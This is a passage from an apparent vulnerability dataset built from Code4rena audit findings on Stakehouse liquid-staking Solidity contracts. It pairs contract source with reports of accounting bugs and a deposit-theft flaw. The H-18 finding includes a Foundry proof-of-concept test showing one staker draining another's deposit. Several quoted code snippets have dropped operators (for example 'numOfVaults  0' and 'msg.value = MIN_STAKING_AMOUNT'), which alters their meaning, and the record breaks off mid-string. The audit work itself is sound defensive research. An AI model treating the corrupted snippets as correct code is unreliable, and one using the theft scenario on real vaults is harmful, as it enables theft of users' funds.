                "Description": "*Submitted by unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25<br\n\nVariable idleETH in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of idleETH of contract, but in function bringUnusedETHBackIntoGiantPool() which brings unused ETH from savETH vault to giant pool the value of idleETH don't get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.\n\n\nThis is bringUnusedETHBackIntoGiantPool() code in GiantSavETHVaultPool():\n\n        /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n        /// @param _savETHVaults List of savETH vaults where ETH is staked\n        /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n        /// @param _amounts Amounts of LP within the giant pool being burnt\n        function bringUnusedETHBackIntoGiantPool(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults  0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    require(\n                        vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                        \"ETH is either staked or derivatives minted\"\n                    );\n                }\n\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n        }\n\nAs you can see it checks that ETH is available in savETH vault and then calls to burnLPTokens() to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don't increase the idleETH value so contract would lose tracking of real idle ETH balance of contract. because the vaule of idleETH is used when withdrawing or depositing into savETH vaults so the contract can't reuse the returned ETH. these are the steps that cause this bug to happen:\n1. giant pool has 100 idleETH.\n2. with function batchDepositETHForStaking() users stake 80 ETH and the new value of idleETH would be 20 and contract LP Token balance increase by 80.\n3. the 80 newly staked ETH is not yet staked in stakehouse.\n4. with function bringUnusedETHBackIntoGiantPool() users bring back those 80 ETH from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because idleETH value don't get increase it still would show 20.\n5. the extra 80 ETH would returned to giant pool wouldn't be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of idleETH has been used to know the amount of idle ETH in giant pool and because the value doesn't show the correct amount so the extra amount of ETH wouldn't be lost.\n\n\nVIM\n\n",
                "Repair": "\nContract should correctly update value of idleETH in different actions because withdraw and deposit logics depend on it.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\n\n/// @dev For pools accepting ETH for validator staking, this contract will manage issuing LPs for deposits\nabstract contract ETHPoolLPFactory is StakehouseAPI {\n\n    /// @notice signalize withdrawing of ETH by depositor\n    event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n\n    /// @notice signalize burning of LP token\n    event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @notice signalize issuance of new LP token\n    event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n\n    /// @notice signalize issuance of existing LP token\n    event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @dev Base name and symbol used for deploying new LP tokens per KNOT\n    string internal baseLPTokenName;\n    string internal baseLPTokenSymbol;\n\n    /// @notice count of unique LP tokens issued for ETH deposits\n    uint256 public numberOfLPTokensIssued;\n\n    /// @notice Maximum amount that can be staked per validator in WEI\n    uint256 public maxStakingAmountPerValidator;\n\n    /// @notice Minimum amount that can be staked per validator in WEI\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Factory for the deployment of KNOT<>LP Tokens that can be used to redeem dETH\n    LPTokenFactory public lpTokenFactory;\n\n    /// @notice LP token address deployed for a KNOT's BLS public key\n    mapping(bytes => LPToken) public lpTokenForKnot;\n\n    /// @notice KNOT BLS public key associated with the LP token\n    mapping(LPToken => bytes) public KnotAssociatedWithLPToken;\n\n    /// @notice Allow users to rotate the ETH from many LP to another in the event that a BLS key is never staked\n    /// @param _oldLPTokens Array of old LP tokens to be burnt\n    /// @param _newLPTokens Array of new LP tokens to be minted in exchange of old LP tokens\n    /// @param _amounts Array of amount of tokens to be exchanged\n    function batchRotateLPTokens(\n        LPToken[] calldata _oldLPTokens,\n        LPToken[] calldata _newLPTokens,\n        uint256[] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _oldLPTokens.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n\n        for (uint256 i; i < numOfRotations; ++i) {\n            rotateLPTokens(\n                _oldLPTokens[i],\n                _newLPTokens[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n    /// @param _oldLPToken Instance of the old LP token (to be burnt)\n    /// @param _newLPToken Instane of the new LP token (to be minted)\n    /// @param _amount Amount of LP tokens to be rotated/converted from old to new\n    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n        require(address(_oldLPToken) != address(0), \"Zero address\");\n        require(address(_newLPToken) != address(0), \"Zero address\");\n        require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n        require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n\n        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n        bytes memory blsPublicKeyOfNewKnot = KnotAssociatedWithLPToken[_newLPToken];\n\n        require(blsPublicKeyOfPreviousKnot.length == 48, \"Incorrect BLS public key\");\n        require(blsPublicKeyOfNewKnot.length == 48, \"Incorrect BLS public key\");\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        // burn old tokens and mint new ones\n        _oldLPToken.burn(msg.sender, _amount);\n        emit LPTokenBurnt(blsPublicKeyOfPreviousKnot, address(_oldLPToken), msg.sender, _amount);\n\n        _newLPToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(KnotAssociatedWithLPToken[_newLPToken], address(_newLPToken), msg.sender, _amount);\n    }\n\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\n    function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n        require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n        // LP token issued for the KNOT\n        // will be zero for a new KNOT because the mapping doesn't exist\n        LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if(address(lpToken) != address(0)) {\n            // KNOT and it's LP token is already registered\n            // mint the respective LP tokens for the user\n\n            // total supply after minting the LP token must not exceed maximum staking amount per validator\n            require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            lpToken.mint(msg.sender, _amount);\n            emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n        }\n        else {\n            // check that amount doesn't exceed max staking amount per validator\n            require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n            \n            // mint new LP tokens for the new KNOT\n            // add the KNOT in the mapping\n            string memory tokenNumber = Strings.toString(numberOfLPTokensIssued);\n            string memory tokenName = string(abi.encodePacked(baseLPTokenName, tokenNumber));\n            string memory tokenSymbol = string(abi.encodePacked(baseLPTokenSymbol, tokenNumber));\n\n            // deploy new LP token and optionally enable transfer notifications\n            LPToken newLPToken = _enableTransferHook ?\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(this), tokenSymbol, tokenName)) :\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(0), tokenSymbol, tokenName));\n\n            // increase the count of LP tokens\n            numberOfLPTokensIssued++;\n\n            // register the BLS Public Key with the LP token\n            lpTokenForKnot[_blsPublicKeyOfKnot] = newLPToken;\n            KnotAssociatedWithLPToken[newLPToken] = _blsPublicKeyOfKnot;\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            newLPToken.mint(msg.sender, _amount);\n            emit NewLPTokenIssued(_blsPublicKeyOfKnot, address(newLPToken), msg.sender, _amount);\n        }\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "ETHPoolLPFactory.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-15",
                "Location": [
                    "user",
                    "_onDepositETH()",
                    "depositETH()",
                    "_setClaimedToMax",
                    "_setClaimedToMax()",
                    "lpTokenETH",
                    "accumulatedETHPerLPShare"
                ],
                "Type": " User loses remaining rewards in  GiantMevAndFeesPool  when new deposits happen because  _onDepositETH()  set  claimed[",
                "Description": "*Submitted by unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48<br\n\nWhen depositETH() is called in giant pool it calls _onDepositETH() which calls _setClaimedToMax() to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.\n\n\nThis is depositETH() code in GiantPoolBase:\n\n        /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n        function depositETH(uint256 _amount) public payable {\n            require(msg.value = MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n            require(msg.value == _amount, \"Value equal to amount\");\n\n            // The ETH capital has not yet been deployed to a liquid staking network\n            idleETH += msg.value;\n\n            // Mint giant LP at ratio of 1:1\n            lpTokenETH.mint(msg.sender, msg.value);\n\n            // If anything extra needs to be done\n            _onDepositETH();\n\n            emit ETHDeposited(msg.sender, msg.value);\n        }\n\nAs you can see it increase user lpTokenETH balance and then calls _onDepositETH(). This is _onDepositETH() and _setClaimedToMax() code in GiantMevAndFeesPool contract:\n\n        /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n        function _onDepositETH() internal override {\n            _setClaimedToMax(msg.sender);\n        }\n\n        /// @dev Internal re-usable method for setting claimed to max for msg.sender\n        function _setClaimedToMax(address _user) internal {\n            // New ETH stakers are not entitled to ETH earned by\n            claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n        }\n\nAs you can see the code set claimed[msg.sender][address(lpTokenETH] to maximum value so the user wouldn't be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can't withdraw them. these are the steps:\n1. user1 deposit 10 ETH to giant pool and accumulatedETHPerLPShare value is 2 and claimed[user1][lpTokenETH] would be 10 * 2 = 20.\n2. some time passes and accumulatedETHPerLPShare set to 4 and user1 has 10 * 4 20 = 20 unclaimed ETH rewards (the formula in the code: balance * rewardPerShare claimed).\n3. user deposit 5 ETH to giant pool and accumulatedETHPerLPShare is 4 so the code would call _onDepositETH() which calls _setClaimedToMax which sets claimed[user1][lpTokenETH] to 15 * 4 = 60.\n4. user1 new remaining ETH reward would be 15 * 4 60 = 0. and user1 won't receive his rewards because when he deposits contract don't transfer remaining rewards and set claim to max so user loses his funds.\n\n\nVIM\n\n",
                "Repair": "\nWhen deposit happens, contract should first send remaining rewards, then increase the user's balance and then set the user claim to max.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-18",
                "Location": [
                    "//solidity\nif (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n    _claimFundsFromSyndicateForDistribution(\n        liquidStakingNetworkManager.syndicate(),\n        _blsPubKeys\n    );\n\n    // Distribute ETH per LP\n    updateAccumulatedETHPerLP();\n}\n\n// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\nLPToken token = lpTokenForKnot[_blsPubKeys[i]];\nrequire(address(token) != address(0), \"Invalid BLS key\");\nrequire(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n_distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n",
                    "//solidity\nfunction _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n    if (_numOfShares  0) {\n        uint256 received = totalRewardsReceived();\n        uint256 unprocessed = received totalETHSeen;\n\n        if (unprocessed  0) {\n            emit ETHReceived(unprocessed);\n\n            // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n            accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n            totalETHSeen = received;\n        }\n    }\n}\n",
                    "//solidity\nfunction _distributeETHRewardsToUserForToken(\n    address _user,\n    address _token,\n    uint256 _balance,\n    address _recipient\n) internal {\n    require(_recipient != address(0), \"Zero address\");\n    uint256 balance = _balance;\n    if (balance  0) {\n        // Calculate how much ETH rewards the address is owed / due \n        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n        if (due  0) {\n            claimed[_user][_token] = due;\n\n            totalClaimed += due;\n\n            (bool success, ) = _recipient.call{value: due}(\"\");\n            require(success, \"Failed to transfer\");\n\n            emit ETHDistributed(_user, _recipient, due);\n        }\n    }\n}\n",
                    "//solidity\n// test/foundry/StakingFundsVault.t.sol\nfunction testStealingOfDepositsByOldStakers_AUDIT() public {\n    // Resetting the mocks, we need real action.\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 0);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne, false);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo, false);\n\n    // Aliasing accounts for better readability.\n    address nodeRunner = accountOne;\n    address alice = accountTwo;\n    address alice2 = accountFour;\n    address bob = accountThree;\n\n    // Node runner registers two BLS keys.\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFive);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyTwo, accountFive);\n\n    // Alice deposits to the MEV+fees vault of the first key.\n    maxETHDeposit(alice, getBytesArrayFromBytes(blsPubKeyOne));\n\n    // Someone else deposits to the savETH vault of the first key.\n    liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyOne, 24 ether);\n\n    // The first validator is registered and the derivatives are minted.\n    assertEq(vault.totalShares(), 0);\n    stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n    assertEq(vault.totalShares(), 4 ether);\n\n    // Warping to pass the lastInteractedTimestamp checks.\n    vm.warp(block.timestamp + 1 hours);\n\n    // The first key cannot accept new deposits since the maximal amount was deposited\n    // and the validator was register. The vault however can still be used to deposit to\n    // other keys.\n\n    // Bob deposits to the MEV+fees vault of the second key.\n    maxETHDeposit(bob, getBytesArrayFromBytes(blsPubKeyTwo));\n    assertEq(address(vault).balance, 4 ether);\n    assertEq(bob.balance, 0);\n\n    // Alice is claiming rewards for the first key.\n    // Notice that no rewards were distributed to the MEV+fees vault of the first key.\n    assertEq(alice2.balance, 0);\n    vm.startPrank(alice);\n    vault.claimRewards(alice2, getBytesArrayFromBytes(blsPubKeyOne));\n    vm.stopPrank();\n\n    LPToken lpTokenBLSPubKeyOne = vault.lpTokenForKnot(blsPubKeyOne);\n\n    // Alice has stolen the Bob's deposit.\n    assertEq(alice2.balance, 4 ether);\n    assertEq(vault.claimed(alice, address(lpTokenBLSPubKeyOne)), 4 ether);\n    assertEq(vault.claimed(alice2, address(lpTokenBLSPubKeyOne)), 0);\n\n    assertEq(address(vault).balance, 0);\n    assertEq(bob.balance, 0);\n}\n"
                ],
                "Type": " Old stakers can steal deposits of new stakers in  StakingFundsVault ",
                "Description": "*Submitted by Jeiwan(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255), also found by immeas(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/387), rbserver(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375), unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/246), cccz(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/227), and 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/114)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63\n\nStakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.\n\n\nStakingFundsVault is designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders ([StakingFundsVault.sol#L215-L231(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L215-L231)):\n\nsolidity\nif (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n    _claimFundsFromSyndicateForDistribution(\n        liquidStakingNetworkManager.syndicate(),\n        _blsPubKeys\n    );\n\n    // Distribute ETH per LP\n    updateAccumulatedETHPerLP();\n}\n\n// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\nLPToken token = lpTokenForKnot[_blsPubKeys[i]];\nrequire(address(token) != address(0), \"Invalid BLS key\");\nrequire(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n_distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n\n\nThe updateAccumulatedETHPerLP function calculates the reward amount per LP token share ([SyndicateRewardsProcessor.sol#L76(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76)):\n\nsolidity\nfunction _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n    if (_numOfShares  0) {\n        uint256 received = totalRewardsReceived();\n        uint256 unprocessed = received totalETHSeen;\n\n        if (unprocessed  0) {\n            emit ETHReceived(unprocessed);\n\n            // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n            accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n            totalETHSeen = received;\n        }\n    }\n}\n\n\nAnd the _distributeETHRewardsToUserForToken function distributes rewards to LP token holders ([SyndicateRewardsProcessor.sol#L51(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51)):\n\nsolidity\nfunction _distributeETHRewardsToUserForToken(\n    address _user,\n    address _token,\n    uint256 _balance,\n    address _recipient\n) internal {\n    require(_recipient != address(0), \"Zero 